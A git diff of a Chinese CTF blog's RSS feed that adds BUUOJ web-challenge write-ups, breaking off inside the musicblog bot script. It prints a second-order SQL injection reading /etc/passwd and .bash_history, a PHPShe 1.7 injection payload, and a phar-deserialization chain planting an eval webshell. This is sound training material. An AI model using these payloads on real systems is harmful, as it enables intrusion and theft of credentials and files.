@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>CTF on AmiaaaZ's Site</title><link>https://amiaaaz.github.io/categories/ctf/</link><description>Recent content in CTF on AmiaaaZ's Site</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Wed, 19 Jan 2022 03:16:47 +0800</lastBuildDate><atom:link href="https://amiaaaz.github.io/categories/ctf/index.xml" rel="self" type="application/rss+xml"/><item><title>buuoj刷题记录-web</title><link>https://amiaaaz.github.io/2022/01/19/buuoj-web-wp/</link><pubDate>Wed, 19 Jan 2022 03:16:47 +0800</pubDate><guid>https://amiaaaz.github.io/2022/01/19/buuoj-web-wp/</guid><description>&lt;p>因为前面做的很多由于时间关系遗忘了不少，趁着寒假来温故知新刷波题，这里就做个buuoj-web部分刷题的存档，应该都比较详细&lt;/p>
 &lt;p>打星号的可能是因为环境问题复现不了，或者自己有地方没搞懂&lt;/p>
-&lt;p>————前排食用注意：可展开的部分中是没有很好的md排版的&lt;/p>
+&lt;p>————前排食用注意：可展开的部分中是没有很好的md排版的（不做二级标题是不想左侧toc和整体页面太臃肿Orz.&lt;/p>
 &lt;hr>
 &lt;h2 id="page-01">page 01&lt;/h2>
 &lt;details>
@@ -746,6 +746,83 @@ echo serialize($a);
 &lt;/code>&lt;/pre>&lt;p>不反序列化也行，它没过滤&lt;code>load_file&lt;/code>直接就读文件了&lt;/p>
 &lt;pre tabindex="0">&lt;code>/view.php?no=-1 union/**/select/**/1,load_file(&amp;quot;/var/www/html/flag.php&amp;quot;),3,4%23
 &lt;/code>&lt;/pre>&lt;p>有点奇怪的，你说它过滤空格，但是前面那个不用注释也可以，而且前面参数是1还不行&lt;/p>
+&lt;/details>
+&lt;h2 id="page-03">page 03&lt;/h2>
+&lt;details>
+&lt;summary>
+&lt;h4 class="inline">
+[网鼎杯 2018]Comment
+&lt;/h4>
+&lt;/summary>
+&lt;p>发帖会先要求登录，提示&lt;code>zhangwei: zhangwei***&lt;/code>，盲猜666，登入&lt;/p>
+&lt;p>帖子的详情页可以提交留言，这里有xss（但是没啥用 又没bot），f12有一句提示&lt;code>程序员GIT写一半跑路了,都没来得及Commit :)&lt;/code>，用Githacker看看源码&lt;/p>
+&lt;pre tabindex="0">&lt;code>githacker --url http://c7839413-2569-4342-ac29-8b5810a4c8c4.node4.buuoj.cn:81/ --folder result
+&lt;/code>&lt;/pre>&lt;p>因为提示说有一个记录没有commit，我们尝试恢复&lt;/p>
+&lt;pre tabindex="0">&lt;code>git log --reflog # 有一条后面带括号(refs/stash) 暂存区
+sudo git reset --hard e5b2a2443c2b6d395d06960123142bc91123148c
+&lt;/code>&lt;/pre>&lt;p>得到完整的源码&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
+&lt;span style="color:#00a8c8">include&lt;/span> &lt;span style="color:#d88200">&amp;#34;mysql.php&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#75af00">session_start&lt;/span>&lt;span style="color:#111">();&lt;/span>
+&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_SESSION&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;login&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#d88200">&amp;#39;yes&amp;#39;&lt;/span>&lt;span style="color:#111">){&lt;/span>
+&lt;span style="color:#75af00">header&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Location: ./login.php&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#00a8c8">die&lt;/span>&lt;span style="color:#111">();&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;do&amp;#39;&lt;/span>&lt;span style="color:#111">])){&lt;/span>
+&lt;span style="color:#00a8c8">switch&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;do&amp;#39;&lt;/span>&lt;span style="color:#111">])&lt;/span>
+&lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#00a8c8">case&lt;/span> &lt;span style="color:#d88200">&amp;#39;write&amp;#39;&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
+&lt;span style="color:#111">$category&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">addslashes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;category&amp;#39;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
+&lt;span style="color:#111">$title&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">addslashes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;title&amp;#39;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
+&lt;span style="color:#111">$content&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">addslashes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;content&amp;#39;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
+&lt;span style="color:#111">$sql&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;insert into board
+&lt;/span>&lt;span style="color:#d88200"> set category = &amp;#39;&lt;/span>&lt;span style="color:#d88200">$category&lt;/span>&lt;span style="color:#d88200">&amp;#39;,
+&lt;/span>&lt;span style="color:#d88200"> title = &amp;#39;&lt;/span>&lt;span style="color:#d88200">$title&lt;/span>&lt;span style="color:#d88200">&amp;#39;,
+&lt;/span>&lt;span style="color:#d88200"> content = &amp;#39;&lt;/span>&lt;span style="color:#d88200">$content&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#111">$result&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">mysql_query&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$sql&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#75af00">header&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Location: ./index.php&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#00a8c8">break&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#00a8c8">case&lt;/span> &lt;span style="color:#d88200">&amp;#39;comment&amp;#39;&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
+&lt;span style="color:#111">$bo_id&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">addslashes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;bo_id&amp;#39;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
+&lt;span style="color:#111">$sql&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;select category from board where id=&amp;#39;&lt;/span>&lt;span style="color:#d88200">$bo_id&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#111">$result&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">mysql_query&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$sql&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#111">$num&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">mysql_num_rows&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$result&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$num&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">){&lt;/span>
+&lt;span style="color:#111">$category&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">mysql_fetch_array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$result&lt;/span>&lt;span style="color:#111">)[&lt;/span>&lt;span style="color:#d88200">&amp;#39;category&amp;#39;&lt;/span>&lt;span style="color:#111">];&lt;/span>
+&lt;span style="color:#111">$content&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">addslashes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;content&amp;#39;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
+&lt;span style="color:#111">$sql&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;insert into comment
+&lt;/span>&lt;span style="color:#d88200"> set category = &amp;#39;&lt;/span>&lt;span style="color:#d88200">$category&lt;/span>&lt;span style="color:#d88200">&amp;#39;,
+&lt;/span>&lt;span style="color:#d88200"> content = &amp;#39;&lt;/span>&lt;span style="color:#d88200">$content&lt;/span>&lt;span style="color:#d88200">&amp;#39;,
+&lt;/span>&lt;span style="color:#d88200"> bo_id = &amp;#39;&lt;/span>&lt;span style="color:#d88200">$bo_id&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#111">$result&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">mysql_query&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$sql&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#75af00">header&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Location: ./comment.php?id=&lt;/span>&lt;span style="color:#d88200">$bo_id&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#00a8c8">break&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#00a8c8">default&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
+&lt;span style="color:#75af00">header&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Location: ./index.php&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#75af00">header&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Location: ./index.php&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
+&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>可以看到只有&lt;code>category&lt;/code>没有被&lt;code>addslashes&lt;/code>过滤，是直接将执行的结果进行拼接，这里是我们的入手点；先在write处插入，再在comment处闭合前面的注释符，执行结果&lt;/p>
+&lt;pre tabindex="0">&lt;code>write: category=',content=user(),/*
+comment: content=*/#
+&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210624160242124.png" alt="image-20210624160242124.png">&lt;/p>
+&lt;pre tabindex="0">&lt;code>write: category=',content=(select load_file('/etc/passwd')),/*
+comment: content=*/#
+&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210624160515229.png" alt="">&lt;/p>
+&lt;p>看到最后一行的www用户，继续查看.bash_history记录&lt;/p>
+&lt;pre tabindex="0">&lt;code>write: category=',content=(select load_file('/home/www/.bash_history')),/*
+comment: content=*/#
+&lt;/code>&lt;/pre>&lt;p>看到了.DS_Store文件，在linux中它的位置一般在&lt;code>/tmp&lt;/code>下，同时.DS_Store中经常有不可见字符，所以加一层hex再读出&lt;/p>
+&lt;pre tabindex="0">&lt;code>write: category=',content=(select hex(load_file('/tmp/html/.DS_Store'))),/*
+comment: content=*/#
+&lt;/code>&lt;/pre>&lt;p>看到flag_8946e1ff1ee3e40f.php，也加一层hex&lt;/p>
+&lt;pre tabindex="0">&lt;code>write: category=',content=(select hex(load_file('/var/www/html/flag_8946e1ff1ee3e40f.php'))),/*
+comment: content=*/#
+&lt;/code>&lt;/pre>&lt;p>————雀食很牛逼的二次注入&lt;/p>
 &lt;/details>
 &lt;h2 id="page-07">page 07&lt;/h2>
 &lt;details>
@@ -2417,7 +2494,917 @@ POST: filename=../../../flag.txt&amp;amp;amiz=&amp;lt;x
 &lt;span style="color:#111">$phar&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#75af00">stopBuffering&lt;/span>&lt;span style="color:#111">();&lt;/span>
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>修改后缀和MIME上传，路径是/login/amiz.jpg（是用户名&lt;/p>
 &lt;p>再回到注册上传那里，修改用户名为&lt;code>php://amiz&lt;/code>，然后GET参数触发shell即可&lt;/p>
-&lt;/details></description></item><item><title>CTFshow1221摆烂杯 Wp</title><link>https://amiaaaz.github.io/2021/12/28/ctfshow-1221-bailancup-wp/</link><pubDate>Tue, 28 Dec 2021 20:06:48 +0800</pubDate><guid>https://amiaaaz.github.io/2021/12/28/ctfshow-1221-bailancup-wp/</guid><description>&lt;p>&lt;a href="https://ctf.show/challenges">https://ctf.show/challenges&lt;/a>&lt;/p>
+&lt;/details>
+&lt;details>
+&lt;summary>
+&lt;h4 class="inline">
+[RoarCTF 2019]PHPShe
+&lt;/h4>
+&lt;/summary>
+&lt;p>附件里有&lt;code>.idea&lt;/code>，给了一些提示，是1.7版本的phpshe，有&lt;a href="https://anquan.baidu.com/article/697">两个已知的cve&lt;/a>，不过xxe那个因为不存在对应的php文件，所以用sql那个cve-2019-9762，下面跟一下分析的过程&lt;/p>
+&lt;p>在include/function/global.func.php下有针对数据库安全的函数&lt;code>pe_dbhold()&lt;/code>&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220119152726454.png" alt="image-20220119152726454">&lt;/p>
+&lt;p>参数会被&lt;code>addslashes&lt;/code>处理，我们的引号和反斜杠不保，那看看有没有不用引号也可以注入的地方或者是宽字节注入&lt;/p>
+&lt;p>在include/plugin/payment/alipay/pay.php中对&lt;code>$order_id&lt;/code>参数进行了这样的处理&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220119153255328.png" alt="image-20220119153255328">&lt;/p>
+&lt;p>其中奇奇怪怪的&lt;code>$_g_id&lt;/code>是对post参数的重命名，在common.php中&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220119153357784.png" alt="image-20220119153357784">&lt;/p>
+&lt;p>用到了&lt;code>extract&lt;/code>对变量名前面加上&lt;code>_g_&lt;/code>或&lt;code>_p_&lt;/code>的前缀&lt;/p>
+&lt;p>回到上面，get方式传入的id参数先经过&lt;code>pe_dbhold&lt;/code>处理后赋值给&lt;code>$order_id&lt;/code>，随后进入&lt;code>order_table&lt;/code>函数，位于hook/order.hook.php&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220119153634436.png" alt="image-20220119153634436">&lt;/p>
+&lt;p>如果传入的参数含有&lt;code>_&lt;/code>，则会以它为分隔符，返回&lt;code>order_&lt;/code>+&lt;code>_&lt;/code>前的第一部分，如果参数不含&lt;code>_&lt;/code>直接返回order&lt;/p>
+&lt;p>再回到前面的&lt;code>pe_select&lt;/code>，位于include/class/db.class.php&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220119154502441.png" alt="image-20220119154502441">&lt;/p>
+&lt;p>这不巧了，参数部分用的是反引号而不是单引号，传入的&lt;code>$order_id&lt;/code>就是这里的&lt;code>$table&lt;/code>部分，&lt;code>dbpre&lt;/code>是数据库表前缀；构造这样的payload&lt;/p>
+&lt;pre tabindex="0">&lt;code>pay` where 1=1 and sleep(5)%23_
+&lt;/code>&lt;/pre>&lt;p>经过&lt;code>order_table&lt;/code>和&lt;code>pe_select&lt;/code>之后是这样的语句&lt;/p>
+&lt;pre tabindex="0">&lt;code>select * from `order_pay` where 1=1 and sleep(5)#` where `order_id` = `pay` where 1=1 and sleep(5)#_ limit 1
+&lt;/code>&lt;/pre>&lt;p>然后找利用点，在include/plugin/payment/alipay/pay.php中有利用点并且有回显位；因为对&lt;code>_&lt;/code>的特殊处理，我们无法用&lt;code>information_schema&lt;/code>来查表，所以只能在不知道列名的情况下注入&lt;/p>
+&lt;pre tabindex="0">&lt;code>select`3`from(select 1,2,3,4,5,6 union select * from admin)a limit 1,1
+&lt;/code>&lt;/pre>&lt;p>构造payload&lt;/p>
+&lt;pre tabindex="0">&lt;code>GET /include/plugin/payment/alipay/pay.php?id=pay`%20where%201=1%20union%20select%201,2,((select`3`from(select%201,2,3,4,5,6%20union%20select%20*%20from%20admin)a%20limit%201,1)),4,5,6,7,8,9,10,11,12%23_
+&lt;/code>&lt;/pre>&lt;p>得到admin密码的md5值，查一下得到&lt;code>altman777&lt;/code>，在/admin.php处登入后台&lt;/p>
+&lt;p>首先在品牌管理处可以上传文件&lt;/p>
+&lt;p>借助.idea给出的提示，在include/class/pclzip.class.php有个比官方文件多出来的&lt;code>__destruct&lt;/code>&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220119161251378.png" alt="image-20220119161251378">&lt;/p>
+&lt;p>还有自带的&lt;code>__construct&lt;/code>&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220119161950386.png" alt="image-20220119161950386">&lt;/p>
+&lt;p>还有个打开的module/admin/moban.php和include/function/global.func.php，在&lt;code>down&lt;/code>操作中实例化上面的&lt;code>PclZip&lt;/code>类，之后用&lt;code>extract()&lt;/code>来解压zip文件，&lt;code>$moban_template&lt;/code>是文件路径&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220119162417889.png" alt="image-20220119162417889">&lt;/p>
+&lt;p>在&lt;code>del&lt;/code>操作中调用&lt;code>pe_dirdel&lt;/code>&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220119162704144.png" alt="image-20220119162704144">&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220119162714647.png" alt="image-20220119162714647">&lt;/p>
+&lt;p>有个&lt;code>is_file($dir_path)&lt;/code>可以触发反序列化&lt;/p>
+&lt;p>结合上面的&lt;code>__destruct&lt;/code>中的&lt;code>extract&lt;/code>，肯定是phar反序列化了，在前面上传的地方上传压缩过的webshell，然后再传入phar，里面参数的路径指向前面的zip路径，被反序列化后触发&lt;code>__destruct&lt;/code> 解压zip到一个可读写目录/var/www/html/data中&lt;/p>
+&lt;pre tabindex="0">&lt;code>&amp;lt;?php eval($_POST['amiz']);?&amp;gt;
+&lt;/code>&lt;/pre>&lt;p>&lt;a href="http://acdb618d-67d7-416b-a534-23a858dbe1e4.node4.buuoj.cn:81/data/attachment/brand/1.zip">http://acdb618d-67d7-416b-a534-23a858dbe1e4.node4.buuoj.cn:81/data/attachment/brand/1.zip&lt;/a>&lt;/p>
+&lt;pre tabindex="0">&lt;code>&amp;lt;?php
+class PclZip{
+var $zipname = '';
+var $zip_fd = 0;
+var $error_code = 1;
+var $error_string = '';
+var $magic_quotes_status;
+var $save_path = '/var/www/html/data';//解压目录
+function __construct($p_zipname){
+$this-&amp;gt;zipname = $p_zipname;
+$this-&amp;gt;zip_fd = 0;
+$this-&amp;gt;magic_quotes_status = -1;
+return;
+}
+}
+$a=new PclZip(&amp;quot;/var/www/html/data/attachment/brand/1.zip&amp;quot;);//压缩的文件路径
+echo serialize($a);
+$phar = new Phar(&amp;quot;phar.phar&amp;quot;);
+$phar-&amp;gt;startBuffering();
+$phar-&amp;gt;setStub(&amp;quot;&amp;lt;?php __HALT_COMPILER(); ?&amp;gt;&amp;quot;);
+$phar-&amp;gt;setMetadata($a);
+$phar-&amp;gt;addFromString(&amp;quot;test.txt&amp;quot;, &amp;quot;m0c1nu7&amp;quot;);
+$phar-&amp;gt;stopBuffering();
+?&amp;gt;
+&lt;/code>&lt;/pre>&lt;p>&lt;a href="http://acdb618d-67d7-416b-a534-23a858dbe1e4.node4.buuoj.cn:81/data/attachment/brand/2.txt">http://acdb618d-67d7-416b-a534-23a858dbe1e4.node4.buuoj.cn:81/data/attachment/brand/2.txt&lt;/a>&lt;/p>
+&lt;p>之后触发phar反序列化&lt;/p>
+&lt;pre tabindex="0">&lt;code>GET /admin.php?mod=moban&amp;amp;act=del&amp;amp;token=709991a77ab3f79e5dcad72d0453978e&amp;amp;tpl=phar:///var/www/html/data/attachment/brand/2.txt
+Referer: http://acdb618d-67d7-416b-a534-23a858dbe1e4.node4.buuoj.cn:81/admin.php?mod=moban
+&lt;/code>&lt;/pre>&lt;p>这里需要传入csrf的token（post上传处可以拿到），还需要设置一下Referer&lt;/p>
+&lt;p>flag{9085d530-559f-49bd-9e0e-718780146bd3}&lt;/p>
+&lt;/details>
+&lt;details>
+&lt;summary>
+&lt;h4 class="inline">
+*[Zer0pts2020]musicblog
+&lt;/h4>
+&lt;/summary>
+&lt;p>注册账号并登入，可以创建post，勾选publish可以有admin访问，这肯定是个xss类的题目了&lt;/p>
+&lt;p>整个站有比较完善的csp规则&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220119180148197.png" alt="image-20220119180148197">&lt;/p>
+&lt;p>看下worker.js的工作逻辑&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">fs&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;fs&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">md5&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;md5&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">puppeteer&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;puppeteer&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">Redis&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;ioredis&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">connection&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Redis&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">6379&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;redis&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">admin_username&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;admin&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">admin_password&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;w28J0zjqpp6w9Ty8Sl58Z7iEf4h911zZ&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">flag&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;zer0pts{M4sh1m4fr3sh!!}&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">browser_option&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#75af00">executablePath&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;google-chrome-unstable&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
+&lt;span style="color:#75af00">headless&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">,&lt;/span>
+&lt;span style="color:#75af00">args&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">[&lt;/span>
+&lt;span style="color:#d88200">&amp;#39;--no-sandbox&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
+&lt;span style="color:#d88200">&amp;#39;--disable-background-networking&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
+&lt;span style="color:#d88200">&amp;#39;--disable-default-apps&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
+&lt;span style="color:#d88200">&amp;#39;--disable-extensions&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
+&lt;span style="color:#d88200">&amp;#39;--disable-gpu&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
+&lt;span style="color:#d88200">&amp;#39;--disable-sync&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
+&lt;span style="color:#d88200">&amp;#39;--disable-translate&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
+&lt;span style="color:#d88200">&amp;#39;--hide-scrollbars&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
+&lt;span style="color:#d88200">&amp;#39;--metrics-recording-only&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
+&lt;span style="color:#d88200">&amp;#39;--mute-audio&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
+&lt;span style="color:#d88200">&amp;#39;--no-first-run&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
+&lt;span style="color:#d88200">&amp;#39;--safebrowsing-disable-auto-update&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
+&lt;span style="color:#111">],&lt;/span>
+&lt;span style="color:#111">};&lt;/span>
+&lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">browser&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">undefined&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">crawl&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">async&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
